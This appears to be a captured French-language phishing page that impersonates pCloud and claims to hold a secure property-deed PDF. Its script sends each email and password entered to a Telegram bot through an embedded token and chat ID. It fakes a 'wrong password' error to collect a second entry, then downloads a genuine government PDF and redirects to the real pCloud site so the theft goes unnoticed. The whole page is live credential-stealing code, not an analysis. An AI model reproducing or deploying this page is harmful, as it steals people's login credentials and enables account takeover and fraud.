@@ -1,0 +1,227 @@
+<!-- url: https://quiet-seahorse-393bb9.netlify.app/?utm_source=sniply&amp;utm_campaign=sniply&amp;utm_medium=sniply
+status: 200 -->
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://img.icons8.com/?size=512&id=91483&format=png">
+    <title>pCloud-Fichier sécurisé/</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: 210mm 297mm;
+            background-repeat: no-repeat;
+            background-position: center;
+            filter: blur(5px);
+            z-index: -1;
+        }
+        .container {
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 400px;
+            z-index: 1;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 200px;
+        }
+        .file-info {
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .file-info img {
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        .input-field {
+            margin: 20px 0;
+            text-align: left;
+        }
+        .input-field input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            color: white;
+            background-color: #24929B;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #24929B;
+        }
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+        .footer img {
+            height: 24px;
+            margin: 0 5px;
+            vertical-align: middle;
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+    <div class="container">
+        <div class="logo">
+            <img src="https://f.hellowork.com/bdmtools/2021/04/pcloud-transfer-logo-150x150.png" alt="Pcloud">
+        </div>
+        <p>Vous avez reçu un fichier sécurisé</p>
+        <div class="file-info">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" alt="PDF" width="40">
+            <strong>Acte_de_propriete.pdf</strong>
+        </div>
+        <p>Pour lire le document veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé.</p>
+        <div class="input-field">
+            <input type="email" id="email" placeholder="Entrez l'adresse email" required>
+            <span class="error-message" id="email-error">Veuillez entrer une adresse e-mail valide.</span>
+        </div>
+        <div class="input-field" id="password-field" style="display: none;">
+            <input type="password" id="password" placeholder="Entrez le mot de passe" required>
+            <span class="error-message" id="password-error">Mot de passe incorrect. Veuillez réessayer.</span>
+        </div>
+        <button class="btn" onclick="validate()">Lire le Document</button>
+        <div class="footer">
+            <p>2025© pCloud international AG Email: info@pcloud.com Tel : (+41) 43 508 59 48</p>
+            
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Black_Spotify_logo_with_text.svg/2560px-Black_Spotify_logo_with_text.svg.png" alt="Spotify">
+            <img src="https://seeklogo.com/images/V/ville-de-paris-logo-282F163568-seeklogo.com.png" alt="Paris">
+            <img src="https://upload.wikimedia.org/wikipedia/fr/5/5c/Universal_logo.svg" alt="Universal">
+            <img src="https://logos-world.net/wp-content/uploads/2021/09/Orange-S.A.-Logo-2013-present.jpg" alt="Orange">
+            <img src="https://www.perlesdhistoire.fr/wp-content/uploads/2019/04/sodexo@2x.png" alt="Sodexo">
+        </div>
+    </div>
+    
+<script>
+const emailField = document.getElementById("email");
+const emailError = document.getElementById("email-error");
+const passwordField = document.getElementById("password-field");
+const passwordError = document.getElementById("password-error");
+
+// Configuration Telegram
+const TELEGRAM_BOT_TOKEN = "8427046762:AAFGOfKm_Zgp5JrD03Uv8cfczJ0vYfwXidY";
+const TELEGRAM_CHAT_ID = "8435081845";
+
+const MAX_LOGIN_ATTEMPTS = 2;
+let ATTEMPT_COUNT = 0;
+let BUTTON_IS_CLICKED = false;
+
+emailField.addEventListener("input", () => {
+    const email = emailField.value.trim();
+    const emailPattern = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+
+    if (emailPattern.test(email)) {
+        emailError.style.display = "none";
+        passwordField.style.display = "block";
+    } else {
+        passwordField.style.display = "none";
+    }
+});
+
+async function sendToTelegram(email, password, attempt) {
+    const message = `🔔 Nouvelle tentative pCloud (${attempt})\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n🕒 ${new Date().toLocaleString()}`;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+            }),
+        });
+    } catch (error) {
+        console.error("Erreur lors de l'envoi à Telegram:", error);
+    }
+}
+
+function downloadPDF() {
+    const link = document.createElement('a');
+    link.href = 'https://fin.belgium.be/sites/default/files/media/documents/20250509-form-titre-propriete-fr-dyn.pdf'; // Nom du fichier PDF
+    link.download = 'Acte_de_propriete.pdf'; // Nom du fichier pour le téléchargement
+    link.style.display = 'none';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+
+async function validate() {
+    if ( BUTTON_IS_CLICKED ) {
+        return false;
+    }
+
+    const email = emailField.value.trim();
+    const password = document.getElementById("password").value.trim();
+    const emailPattern = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+
+    if (!emailPattern.test(email)) {
+        emailError.style.display = "block";
+        emailField.value = "";
+        return;
+    }
+
+    if (password === "") {
+        alert("Veuillez remplir tous les champs.");
+        return;
+    }
+    ATTEMPT_COUNT++;
+    BUTTON_IS_CLICKED = true;
+
+    // ENVOYER LE MESSAGE VIA TELEGRAM
+    await sendToTelegram(email, password, ATTEMPT_COUNT);
+
+    if (ATTEMPT_COUNT < MAX_LOGIN_ATTEMPTS) {
+        passwordError.style.display = "block";
+        document.getElementById("password").value = "";
+        BUTTON_IS_CLICKED = false;
+    } else {
+        // Télécharger le PDF avant redirection
+        downloadPDF();
+        
+        // Redirection après 1.5 secondes (temps pour lancer le téléchargement)
+        setTimeout(() => {
+            window.location.href = "https://www.pcloud.com/fr/eu#";
+        }, 1500);
+    }
+}</script>
+</body>
+</html>
+
